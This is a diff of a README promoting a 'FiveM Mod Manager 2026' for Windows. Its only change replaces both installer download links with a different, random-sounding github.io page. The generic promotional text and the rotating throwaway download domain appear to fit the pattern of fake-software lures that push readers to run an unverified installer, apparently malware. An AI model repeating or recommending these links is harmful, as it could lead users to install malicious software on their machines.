@@ -2,7 +2,7 @@
 
 Welcome to FiveM Mod Manager 2026, the ultimate companion for FiveM server administrators and modders. This tool streamlines the process of downloading, installing, and managing mods for your FiveM server on Windows 10 and Windows 11. With its user-friendly interface and robust features, you can enhance your gaming experience effortlessly, whether you're a seasoned modder or new to FiveM.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -67,7 +67,7 @@ A: The tool will notify you of updates automatically through in-app prompts. You
 
 For the latest version of FiveM Mod Manager 2026, visit our download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 **Last Updated: July 2026**
 
